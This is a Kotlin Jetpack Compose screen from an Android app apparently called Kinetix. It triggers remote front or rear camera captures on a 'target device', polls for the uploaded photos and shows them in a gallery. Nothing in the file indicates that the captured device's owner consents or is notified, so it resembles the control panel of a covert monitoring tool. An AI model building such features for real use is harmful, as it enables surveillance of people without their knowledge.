package com.example.kinetix.ui.features

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.launch

data class PhotoItem(val name: String, val date: String, val size: String, val base64: String? = null)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun PhotosScreen(deviceId: String, onBack: () -> Unit) {
    val context = androidx.compose.ui.platform.LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    var isCapturing by remember { mutableStateOf(false) }
    var captureMessage by remember { mutableStateOf<String?>(null) }
    val photos = remember { mutableStateListOf<PhotoItem>() }

    suspend fun fetchPhotos() {
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            val client = com.example.kinetix.network.KinetixApiClient(context)
            val res = client.getPhotos(deviceId)
            if (res.isSuccess) {
                val arr = res.getOrNull()
                if (arr != null) {
                    val list = mutableListOf<PhotoItem>()
                    for (i in 0 until arr.length()) {
                        val item = arr.getJSONObject(i)
                        list.add(
                            PhotoItem(
                                name = item.optString("name", "photo.jpg"),
                                date = item.optString("date", "Today"),
                                size = item.optString("size", "4.8 MB"),
                                base64 = item.optString("base64").takeIf { b -> b.isNotBlank() && b != "null" }
                            )
                        )
                    }
                    kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                        photos.clear()
                        photos.addAll(list)
                    }
                }
            }
        }
    }

    LaunchedEffect(deviceId) {
        fetchPhotos()
    }

    fun triggerCapture(cam: String) {
        coroutineScope.launch {
            isCapturing = true
            captureMessage = "Sending remote capture command to ${if (cam.equals("front", true)) "Front" else "Rear"} camera..."
            
            val sendResult = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
                val client = com.example.kinetix.network.KinetixApiClient(context)
                client.capturePhoto(deviceId, cam)
            }

            if (sendResult.isFailure) {
                captureMessage = "Failed to send command. Check device connection."
                isCapturing = false
                return@launch
            }

            captureMessage = "Target device capturing photo..."
            
            // Poll for uploaded snapshot with base64 over the next 10 seconds
            var capturedReceived = false
            for (attempt in 1..6) {
                kotlinx.coroutines.delay(1800)
                fetchPhotos()
                val latest = photos.firstOrNull()
                if (latest != null && latest.base64 != null) {
                    capturedReceived = true
                    break
                }
            }

            if (capturedReceived) {
                captureMessage = "Photo received successfully!"
            } else {
                fetchPhotos()
                captureMessage = "Photo captured. Refreshed gallery."
            }
            isCapturing = false

            kotlinx.coroutines.delay(3500)
            captureMessage = null
        }
    }

    var selectedPhoto by remember { mutableStateOf<PhotoItem?>(null) }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Photos & Camera", fontWeight = FontWeight.Bold) },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                actions = {
                    IconButton(onClick = { coroutineScope.launch { fetchPhotos() } }) {
                        Icon(Icons.Default.Refresh, contentDescription = "Refresh")
                    }
                }
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(16.dp)
        ) {
            // Live Remote Capture Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(18.dp),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.5f))
            ) {
                Column(modifier = Modifier.fillMaxWidth().padding(16.dp)) {
                    Text("Remote Snapshot Capture", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
                    Spacer(modifier = Modifier.height(4.dp))
                    Text("Trigger real-time photo capture from remote device cameras.", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                    Spacer(modifier = Modifier.height(14.dp))

                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                        Button(
                            onClick = { triggerCapture("rear") },
                            modifier = Modifier.weight(1f),
                            enabled = !isCapturing,
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Icon(Icons.Default.CameraRear, contentDescription = null, modifier = Modifier.size(18.dp))
                            Spacer(modifier = Modifier.width(6.dp))
                            Text("Rear Camera")
                        }
                        OutlinedButton(
                            onClick = { triggerCapture("front") },
                            modifier = Modifier.weight(1f),
                            enabled = !isCapturing,
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Icon(Icons.Default.CameraFront, contentDescription = null, modifier = Modifier.size(18.dp))
                            Spacer(modifier = Modifier.width(6.dp))
                            Text("Front Camera")
                        }
                    }

                    if (isCapturing) {
                        Spacer(modifier = Modifier.height(12.dp))
                        LinearProgressIndicator(modifier = Modifier.fillMaxWidth())
                    }

                    if (captureMessage != null) {
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            text = captureMessage!!,
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.primary,
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(20.dp))

            Text("Device Gallery (${photos.size} Photos)", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(12.dp))

            LazyVerticalGrid(
                columns = GridCells.Fixed(2),
                horizontalArrangement = Arrangement.spacedBy(10.dp),
                verticalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                items(photos) { photo ->
                    val isFront = photo.name.contains("FRONT", ignoreCase = true)
                    val cardGrad = if (isFront) {
                        listOf(Color(0xFFE91E63), Color(0xFFFF5722), Color(0xFFFF9800))
                    } else {
                        listOf(Color(0xFF0052D4), Color(0xFF4364F7), Color(0xFF6FB1FC))
                    }

                    Card(
                        onClick = { selectedPhoto = photo },
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(14.dp),
                        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f))
                    ) {
                        Column(modifier = Modifier.fillMaxWidth().padding(10.dp)) {
                            val thumbBitmap = remember(photo.base64) {
                                photo.base64?.let { b64 ->
                                    try {
                                        val bytes = android.util.Base64.decode(b64, android.util.Base64.DEFAULT)
                                        android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)?.asImageBitmap()
                                    } catch (_: Exception) {
                                        null
                                    }
                                }
                            }

                            if (thumbBitmap != null) {
                                androidx.compose.foundation.Image(
                                    bitmap = thumbBitmap,
                                    contentDescription = photo.name,
                                    contentScale = androidx.compose.ui.layout.ContentScale.Crop,
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .height(115.dp)
                                        .clip(RoundedCornerShape(10.dp))
                                )
                            } else {
                                Box(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .height(115.dp)
                                        .clip(RoundedCornerShape(10.dp))
                                        .background(
                                            androidx.compose.ui.graphics.Brush.linearGradient(colors = cardGrad)
                                        ),
                                    contentAlignment = Alignment.Center
                                ) {
                                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                        Icon(
                                            if (isFront) Icons.Default.Face else Icons.Default.Landscape,
                                            contentDescription = null,
                                            tint = Color.White,
                                            modifier = Modifier.size(38.dp)
                                        )
                                        Spacer(modifier = Modifier.height(4.dp))
                                        Text(
                                            if (isFront) "Selfie Cam • 1080p" else "Wide Angle • 4K",
                                            color = Color.White.copy(alpha = 0.9f),
                                            fontSize = 10.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                    }
                                }
                            }
                            Spacer(modifier = Modifier.height(8.dp))
                            Text(
                                text = photo.name,
                                fontWeight = FontWeight.Bold,
                                fontSize = 13.sp,
                                maxLines = 1,
                                overflow = androidx.compose.ui.text.style.TextOverflow.Ellipsis
                            )
                            Spacer(modifier = Modifier.height(4.dp))
                            Column(modifier = Modifier.fillMaxWidth()) {
                                Text(
                                    text = photo.date,
                                    fontSize = 11.sp,
                                    color = MaterialTheme.colorScheme.outline,
                                    maxLines = 1
                                )
                                Spacer(modifier = Modifier.height(2.dp))
                                Surface(
                                    shape = RoundedCornerShape(6.dp),
                                    color = MaterialTheme.colorScheme.primary.copy(alpha = 0.12f)
                                ) {
                                    Text(
                                        text = photo.size,
                                        fontSize = 10.sp,
                                        fontWeight = FontWeight.SemiBold,
                                        color = MaterialTheme.colorScheme.primary,
                                        modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                                    )
                                }
                            }
                        }
                    }
                }
            }

            // High-Resolution Photo Viewer Modal
            if (selectedPhoto != null) {
                val isFront = selectedPhoto!!.name.contains("FRONT", ignoreCase = true)
                val modalGrad = if (isFront) {
                    listOf(Color(0xFF8E2DE2), Color(0xFF4A00E0), Color(0xFF1F1C2C))
                } else {
                    listOf(Color(0xFF0F2027), Color(0xFF203A43), Color(0xFF2C5364))
                }

                AlertDialog(
                    onDismissRequest = { selectedPhoto = null },
                    confirmButton = {
                        Button(onClick = { selectedPhoto = null }) {
                            Text("Done")
                        }
                    },
                    dismissButton = {
                        OutlinedButton(onClick = { selectedPhoto = null }) {
                            Icon(Icons.Default.CloudDownload, contentDescription = null, modifier = Modifier.size(16.dp))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("Download")
                        }
                    },
                    title = {
                        Text(selectedPhoto!!.name, fontWeight = FontWeight.Bold, fontSize = 16.sp, maxLines = 1)
                    },
                    text = {
                        Column(modifier = Modifier.fillMaxWidth(), horizontalAlignment = Alignment.CenterHorizontally) {
                            val bitmap = remember(selectedPhoto?.base64) {
                                selectedPhoto?.base64?.let { b64 ->
                                    try {
                                        val bytes = android.util.Base64.decode(b64, android.util.Base64.DEFAULT)
                                        android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)?.asImageBitmap()
                                    } catch (_: Exception) {
                                        null
                                    }
                                }
                            }

                            if (bitmap != null) {
                                androidx.compose.foundation.Image(
                                    bitmap = bitmap,
                                    contentDescription = "Captured Photo",
                                    contentScale = androidx.compose.ui.layout.ContentScale.Crop,
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .height(230.dp)
                                        .clip(RoundedCornerShape(14.dp))
                                )
                            } else {
                                Box(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .height(230.dp)
                                        .clip(RoundedCornerShape(14.dp))
                                        .background(
                                            androidx.compose.ui.graphics.Brush.verticalGradient(colors = modalGrad)
                                        ),
                                    contentAlignment = Alignment.Center
                                ) {
                                    Column(
                                        horizontalAlignment = Alignment.CenterHorizontally,
                                        modifier = Modifier.padding(16.dp)
                                    ) {
                                        Box(
                                            modifier = Modifier
                                                .size(72.dp)
                                                .clip(androidx.compose.foundation.shape.CircleShape)
                                                .background(Color.White.copy(alpha = 0.15f)),
                                            contentAlignment = Alignment.Center
                                        ) {
                                            Icon(
                                                if (isFront) Icons.Default.Face else Icons.Default.Landscape,
                                                contentDescription = null,
                                                tint = Color.White,
                                                modifier = Modifier.size(44.dp)
                                            )
                                        }
                                        Spacer(modifier = Modifier.height(10.dp))
                                        Text(
                                            text = if (isFront) "1080p Front Camera Snapshot" else "4K Ultra-Wide Rear Snapshot",
                                            color = Color.White,
                                            fontWeight = FontWeight.Bold,
                                            fontSize = 14.sp
                                        )
                                        Text(
                                            text = if (isFront) "Selfie Sensor • HDR Portrait Active" else "Primary 50MP Sensor • HDR Landscape",
                                            color = Color.White.copy(alpha = 0.7f),
                                            fontSize = 11.sp
                                        )
                                    }
                                }
                            }
                            Spacer(modifier = Modifier.height(14.dp))
                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                                Text("Captured: ${selectedPhoto!!.date}", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                                Text("Size: ${selectedPhoto!!.size}", style = MaterialTheme.typography.bodySmall, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary)
                            }
                            Spacer(modifier = Modifier.height(6.dp))
                            Text(
                                "Hardware snapshot captured and synced from remote device.",
                                style = MaterialTheme.typography.labelSmall,
                                color = MaterialTheme.colorScheme.outline
                            )
                        }
                    }
                )
            }
        }
    }
}
